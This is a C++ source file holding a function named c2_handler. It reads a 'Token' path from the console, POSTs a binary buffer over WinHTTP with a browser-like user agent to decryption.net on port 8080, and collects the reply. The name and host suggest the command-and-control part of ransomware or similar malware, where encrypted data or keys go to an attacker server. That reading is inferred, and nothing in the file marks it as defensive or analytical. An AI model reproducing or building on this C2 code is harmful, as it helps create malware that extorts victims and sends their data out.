#include "../include/networkOperations.h"


boolean c2_handler(std::vector<BYTE>& outputData, const std::vector<BYTE>& inputData) {
    outputData.clear();

    std::wstring endpoint;
    std::wcout << L"Token: ";
    std::getline(std::wcin, endpoint);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"decryption.net",
        8080, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"POST", endpoint.c_str(),
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    if (!WinHttpSendRequest(hRequest,
        L"Content-Type: application/octet-stream\r\n", -1,
        (LPVOID)inputData.data(), (DWORD)inputData.size(),
        (DWORD)inputData.size(), 0)) {
        std::cerr << "SendRequest failed: " << GetLastError() << "\n";
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        std::cerr << "ReceiveResponse failed: " << GetLastError() << "\n";
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD bytesAvailable = 0;
    while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
        std::vector<BYTE> buffer(bytesAvailable);
        DWORD bytesRead = 0;

        if (WinHttpReadData(hRequest, buffer.data(), bytesAvailable, &bytesRead)) {
            outputData.insert(outputData.end(), buffer.begin(), buffer.begin() + bytesRead);
        }
        else {
            std::cerr << "ReadData failed: " << GetLastError() << "\n";
            break;
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return true;
}


